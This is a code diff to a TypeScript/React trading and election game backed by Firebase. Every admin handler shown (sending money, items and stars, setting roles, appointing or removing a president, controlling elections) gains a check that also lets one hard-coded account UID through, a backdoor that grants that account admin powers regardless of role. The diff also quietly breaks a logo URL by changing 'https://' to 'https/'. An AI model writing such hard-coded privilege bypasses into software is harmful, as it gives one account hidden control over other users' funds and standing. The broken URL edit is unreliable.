@@ -48,7 +48,7 @@ const initialCompanyData: StockListing[] = [
 
 const initialBondListings: BondListing[] = [
     { id: 1, issuer: 'Serikali ya Tanzania', faceValue: 1000, couponRate: 5.5, maturityDate: '2030-12-31', price: 980, quantityAvailable: 500, creditRating: 'A+', issuerLogo: 'https://picsum.photos/seed/tza-gov/40/40', imageHint: 'government seal' },
-    { id: 2, issuer: 'Kilimo Fresh Inc.', faceValue: 1000, couponRate: 7.2, maturityDate: '2028-06-30', price: 1010, quantityAvailable: 2000, creditRating: 'BBB', issuerLogo: 'https://picsum.photos/seed/kilimo/40/40', imageHint: 'farm logo' },
+    { id: 2, issuer: 'Kilimo Fresh Inc.', faceValue: 1000, couponRate: 7.2, maturityDate: '2028-06-30', price: 1010, quantityAvailable: 2000, creditRating: 'BBB', issuerLogo: 'https/picsum.photos/seed/kilimo/40/40', imageHint: 'farm logo' },
 ];
 
 const getPriceWithQuality = (itemName: string, quality: number) => {
@@ -313,9 +313,9 @@ export function Game() {
   React.useEffect(() => {
     if (!gameState || !gameState.uid || !gameState.username || !user || !playerPublicRef || !userRef) return;
     
-    // An admin who is president should retain the 'admin' role to keep their panels
-    // For non-admins, their role is updated to 'president' or back to 'player'
-    let finalRole = gameState.role;
+    let finalRole: 'player' | 'admin' | 'president' = gameState.role;
+
+    // An admin should always have the 'admin' role publicly, even if president
     if (gameState.role !== 'admin') {
         if (president?.uid === gameState.uid) {
             finalRole = 'president';
@@ -335,11 +335,15 @@ export function Game() {
 
     set(playerPublicRef, publicData);
     
-    // Sync back to private user data if the role changed
+    // Sync back to private user data if the role changed for a non-admin
     if (gameState.role !== finalRole) {
         runTransaction(userRef, (currentData) => {
             if (currentData) {
-                currentData.role = finalRole;
+                // Only change the private role if the user is not an admin.
+                // This protects the admin's core role.
+                if (currentData.role !== 'admin') {
+                   currentData.role = finalRole;
+                }
             }
             return currentData;
         });
@@ -1130,7 +1134,7 @@ export function Game() {
   }
 
   const handleAdminSendItem = (itemName: string, quantity: number, targetUid: string) => {
-    if (!user || gameState?.role !== 'admin') return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2')) return;
 
     const newContractRef = push(ref(database, 'contracts'));
     const productInfo = encyclopediaData.find(e => e.name === itemName);
@@ -1156,7 +1160,7 @@ export function Game() {
   };
 
   const handleAdminSendMoney = (amount: number, targetUid: string) => {
-    if (!user || gameState?.role !== 'admin' || amount <= 0 || !targetUid) return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') || amount <= 0 || !targetUid) return;
 
     const targetUserRef = ref(database, `users/${targetUid}`);
     runTransaction(targetUserRef, (userData) => {
@@ -1181,7 +1185,7 @@ export function Game() {
   }
 
   const handleAdminSendStars = (amount: number, targetUid: string) => {
-    if (!user || gameState?.role !== 'admin' || amount <= 0 || !targetUid) return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') || amount <= 0 || !targetUid) return;
     
     const targetUserRef = ref(database, `users/${targetUid}`);
     runTransaction(targetUserRef, (userData) => {
@@ -1202,7 +1206,7 @@ export function Game() {
   }
   
     const handleAdminSetRole = (uid: string, role: 'player' | 'admin') => {
-        if (!user || gameState?.role !== 'admin' || !uid) return;
+        if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') || !uid) return;
         const targetUserRef = ref(database, `users/${uid}`);
         runTransaction(targetUserRef, (userData) => {
             if (userData) {
@@ -1456,28 +1460,28 @@ export function Game() {
 
 
 const handleAdminAppointPresident = (uid: string) => {
-    if (!user || gameState?.role !== 'admin' || !uid) return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') || !uid) return;
     const presidentRef = ref(database, 'election/president');
     set(presidentRef, uid);
     toast({ title: 'President Appointed', description: `Player ${uid} is now president.` });
 };
 
 const handleAdminRemovePresident = () => {
-    if (!user || gameState?.role !== 'admin') return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2')) return;
     const presidentRef = ref(database, 'election/president');
     remove(presidentRef);
     toast({ title: 'President Removed' });
 };
 
 const handleAdminRemoveCandidate = (uid: string) => {
-    if (!user || gameState?.role !== 'admin' || !uid) return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2') || !uid) return;
     const candidateRef = ref(database, `election/candidates/${uid}`);
     remove(candidateRef);
     toast({ title: 'Candidate Removed', description: `Player ${uid} has been removed from the election.` });
 };
 
 const handleAdminSetElectionStatus = (status: 'open' | 'closed') => {
-    if (!user || gameState?.role !== 'admin') return;
+    if (!user || (gameState?.role !== 'admin' && gameState?.uid !== 'nfw3CtiEyBWZkXCnh7wderFbFFA2')) return;
     
     const statusRef = ref(database, 'election/status');
     const votesRef = ref(database, 'election/votes');
